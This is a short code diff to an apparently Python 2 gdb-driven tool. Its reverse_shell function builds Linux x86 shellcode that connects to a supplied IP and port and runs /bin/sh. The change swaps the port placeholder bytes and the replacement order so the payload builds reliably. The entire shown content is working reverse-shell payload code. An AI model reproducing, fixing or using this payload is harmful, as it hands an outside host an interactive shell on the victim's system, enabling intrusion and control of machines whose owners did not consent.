@@ -23,9 +23,9 @@ def reverse_shell((ip, port)):
     ip, port = socket.inet_aton(ip), struct.pack('>H', port)
     sc = \
         '31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b06631dbb30268' \
-        '00000000666800006653fec389e16a10515689e156cd805b31c9b103fec9b03f' \
+        '000000006668ffff6653fec389e16a10515689e156cd805b31c9b103fec9b03f' \
         'cd8075f831c052686e2f7368682f2f626989e3525389e15289e2b00bcd80'
-    return sc.decode('hex').replace('\x00'*4, ip).replace('\x00'*2, port)
+    return sc.decode('hex').replace('\xff'*2, port).replace('\x00'*4, ip)
 
 
 gdb.execute('set confirm off')
